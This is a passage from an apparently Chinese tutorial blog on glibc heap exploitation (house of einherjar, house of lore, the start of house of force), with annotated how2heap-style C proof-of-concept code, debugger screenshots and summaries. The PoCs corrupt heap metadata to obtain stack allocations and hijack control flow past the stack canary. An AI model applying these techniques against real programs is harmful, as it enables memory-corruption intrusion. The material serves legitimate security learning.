class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span>* a;</span><br><span class="line"><span class="keyword">uint8_t</span>* b;</span><br><span class="line"><span class="keyword">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="comment">// 我们可以在任意一个我们想要的地方来创建一个fake chunk，本例中我们将在栈上创建这个fake_chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 当然你也可以在heap或者bss段任意一个你知道地址的地方创建fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 我们将我们的fwd和bck指针指向fake_chunk来pass unlink的checks</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">    <span class="comment">//尽管有的时候我们可以在这儿使用unsafe unlink技术</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">fake_chunk[<span class="number">4</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">fake_chunk[<span class="number">5</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"><span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;b&#x27;.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span>* b_size_ptr = (<span class="keyword">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// 这个技术通过覆盖chunk的size以及pre_inuse位来工作</span></span><br><span class="line"><span class="comment">/* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">    <span class="comment">// 如果b的size是0x100的倍数，那么就很简单了，连size都不用改，直接修改他的pre_inuse位就好啦</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This is easiest if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">   <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"><span class="comment">// 如果已经被修改了，我们将在b内需要一个fake chunk，它将尝试合并下一个块</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;If it had been modified, we would need a fake chunk inside &quot;</span></span><br><span class="line">   <span class="string">&quot;b where it will try to consolidate the next chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write a fake prev_size to the end of a</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of a so that &quot;</span></span><br><span class="line">   <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"><span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>) - (<span class="keyword">uint8_t</span>*)fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">*(<span class="keyword">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改fake chunk的size去反应b的新的prev_size</span></span><br><span class="line"><span class="comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);</span><br><span class="line">fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free b，之后他就会和我们的fake chunk合并了</span></span><br><span class="line"><span class="comment">// free b and it will consolidate with our fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果我们在free b之前分配另一个chunk,我们需要做两件事</span></span><br><span class="line"><span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line"><span class="comment">//do two things: </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//1)我们将需要调整我们的fake chunk的size来使得fake_chunk+fake_chunk的size指针在我们所能控制的区域内</span></span><br><span class="line"><span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line"><span class="comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//2)我们将需要在我们控制的地址写我们的fake chunk的size</span></span><br><span class="line"><span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line"><span class="comment">//at the location we control. </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//在做了这两件事情之后，当unlink被调用的时候，我们的Fake chunk就将通过check</span></span><br><span class="line"><span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line"><span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//否则我们需要确定我们的fake chunk可以抵御荒野？？？(荒野这里有点迷离</span></span><br><span class="line"><span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line"><span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在我们再调用malloc的时候，返回的时候就该是我们fake chunk的地址了</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-10"><a href="#运行结果及调试-10" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先是chunk a</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516955852/0" alt="image-20210512144837108"></p><p>然后给我们的fake_chunk赋值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516959141/0" alt="image-20210512144928302"></p><p>然后malloc了b</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13516978344/0" alt="image-20210512145418191"></p><p>然后我们将b的size的pre_inuse位置0</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13517001948/0" alt="image-20210512145944408"></p><p>此时设置我们的fake chunk的size和b的pre_size为b和fake chunk的差值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13518881665/0" alt="image-20210512215635345"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13518881916/0" alt="image-20210512215642413"></p><p>现在我们free b，程序通过pre_size就会去找fake chunk，又发现fake chunk也是free态的，因此就会与我们的fake chunk合并，此时我们再次malloc的话</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13518886966/0" alt="image-20210512215843671"></p><h2 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h2><p>程序首先malloc了chunk a(0x38)</p><p>之后呢在栈上创建了fake chunk,并且伪造了fake chunk的结构</p><p>随后程序又malloc了chunk b(0xf8),b和top chunk相邻</p><p>我们计算量b和fake chunk的地址差后,将b的pre_size设为了我们的差值,并把b的pre_inuse置0,之后free掉了b</p><p>此时b就通过pre_size找到了我们的fake chunk并且与我们的fake chunk合并了,现在我们再申请一个chunk,就会从fake chunk那分配了</p><p>条件：</p><ol><li>被合并的chunk需要在free态，可以直接释放啥的，也可以伪造为free态(通过下一个chunk的pre_inuse位)</li><li>伪造合并的chunk的pre_size和被合并的chunk的size需要相同</li></ol><h1 id="0x12-house-of-lore"><a href="#0x12-house-of-lore" class="headerlink" title="0x12 house of lore"></a>0x12 house of lore</h1><p>这个方法利用small bin的机制而导致任意地址分配，利用下面的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[ ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line"></span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> e·rrout;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">       bin-&gt;bk = bck;</span><br><span class="line">       bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">       [ ... ]</span><br></pre></td></tr></table></figure><p>我们需要做的就是将small bin的bk指针指向我们的fake chunk，也就是控制bck，但是要注意的是bck-&gt;fd!=victim这个地方需要绕过。</p><h2 id="源代码-12"><a href="#源代码-12" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这个版本也可以绕过glibc malloc引入的强化检查</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 分配victim  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="comment">// 这是堆上的第一个samll chunk  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 我们需要去掉头部大小才能得到真正的victim地址  </span></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在栈上创建一个fake chunk  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 我们把fwd指针指向victim_chunk来绕过第二个malloc到最后一个malloc上small bin corrupted检查，这样就可以将我们的栈地址写到small bin list里了</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将我们的bk指针指向stack_buffer_2并且将stack_buffer_2的fwd指针指向stack_buffer_1来绕过最后一个malloc上small bin corrupted的检查，这样就可以在栈上返回一个假的chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 分配另一个large bin来避免small bin在free的时候与top chunk合并  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// free顶块,此时会将它放进unsorted bin中  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在unsorted bin中,victim的fwd和bk指针都是0  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 现在调用一个不会被unsorted bin或者small bin处理的malloc  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这也意味着chunk victim会被插入到smallbin的最前面  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line">  <span class="comment">// victim chunk已经被排序并且他的fwd和bk指针也被更新了</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line">  <span class="comment">// 现在假设我们有一个漏洞可以覆盖victim-&gt;bk指针</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">  <span class="comment">// victim-&gt;bk正指向栈上</span></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="comment">// 现在我们分配一个和我们第一次free大小一样的chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 这个操作将会给我们返回已经被覆写的victim chunk并且将bin-&gt;bk指向被注入的victim-&gt;bk指针  </span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这个最后一次的malloc将欺骗glibc malloc返回一个在bin-&gt;bk中被注入的chunk</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 而stack_buffer_2的fwd指针也在最后一次的malloc中被修改了</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="keyword">intptr_t</span> sc = (<span class="keyword">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line">  <span class="built_in">memcpy</span>((p4+<span class="number">40</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-11"><a href="#运行结果及调试-11" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>现在malloc了victim和申请了两个变量</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538704706/0" alt="image-20210518133327151"></p><p>然后修改了stack_buffer_1的值</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538706340/0" alt="image-20210518133401242"></p><p>第二次修改</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538707201/0" alt="image-20210518133423762"></p><p>现在分配p5来避免free victim的时候被合并到top chunk中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538708409/0" alt="image-20210518133449918"></p><p>接着我们free掉victim，它就会被放入fastbin中</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538723461/0" alt="image-20210518133848039"></p><p>此时我们malloc一个超大的chunk，我们的victim就会被放入small bin中，这里其实就是发生了malloc_conslidate</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538728910/0" alt="image-20210518134030220"></p><p>现在我们修改victim的bk指针，使其指向栈上</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13538742110/0" alt="image-20210518134521708"></p><p>现在我们再申请一个victim一样大小的chunk，因为small bin是FIFO，所以头会先取出</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539172103/0" alt="image-20210518153352548"></p><p>现在我们再申请一个chunk就能申请到栈上了</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13539177625/0" alt="image-20210518153452322"></p><h2 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h2><p>程序首先在栈上定义了两个变量,stack_buffer_1[4],stack_buffer_2[3]</p><p>随后在栈上创建了一个fake chunk,将stack_buffer_1的fwd指针指向了victim_chunk</p><p>随后将stack_buffere_1的bk指针指向了stack_buffer_2,将stack_buffer_2的fwd指针指向了stack_buffer_1来绕过检查</p><p>之后为了将我们的victim放进我们的small bin中,申请一个超大的chunk</p><p>在victim被放进了small bin后,我们只需要覆盖victim的bk指针指向我们的stack_buffer_1即可</p><p>现在我们再分配一个大小为100的chunk,系统就会把victim返回给我们,但此时small bin中还有我们依旧伪造好的fake chunk</p><p>此时再分配就可以将我们的fake chunk拿出来了</p><p>条件：</p><ol><li>能够控制small bin中的bk指针</li></ol><p>感觉这种是不是换成unsorted bin是不是也行？我猜的</p><h1 id="0x13-house-of-force"><a href="#0x13-house-of-force" class="headerlink" title="0x13 house of force"></a>0x13 house of force</h1><p>利用一个巨大的size来改写top chunk的size</p><h2 id="源代码-13"><a href="#源代码-13" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bss_var是我们要覆写的string</span></span><br><span class="line"><span class="keyword">char</span> bss_var[] = 